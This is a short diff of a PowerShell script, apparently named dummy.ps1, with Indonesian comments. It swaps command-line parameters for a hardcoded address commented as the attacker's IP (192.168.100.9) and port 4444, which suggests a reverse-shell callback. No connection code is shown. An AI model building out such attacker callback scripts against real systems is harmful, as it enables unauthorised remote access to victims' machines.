@@ -1,11 +1,10 @@
-param (
-    [string]$l,
-    [int]$p
-)
+# Tentukan IP dan Port yang digunakan secara langsung
+$l = "192.168.100.9"  # IP Penyerang
+$p = 4444             # Port untuk koneksi
 
-# Pastikan IP dan port valid
+# Pastikan IP dan Port valid
 if (-not $l -or -not $p) {
-    Write-Host "Usage: dummy.ps1 -l <IP> -p <Port>"
+    Write-Host "IP atau Port tidak valid"
     exit
 }
 
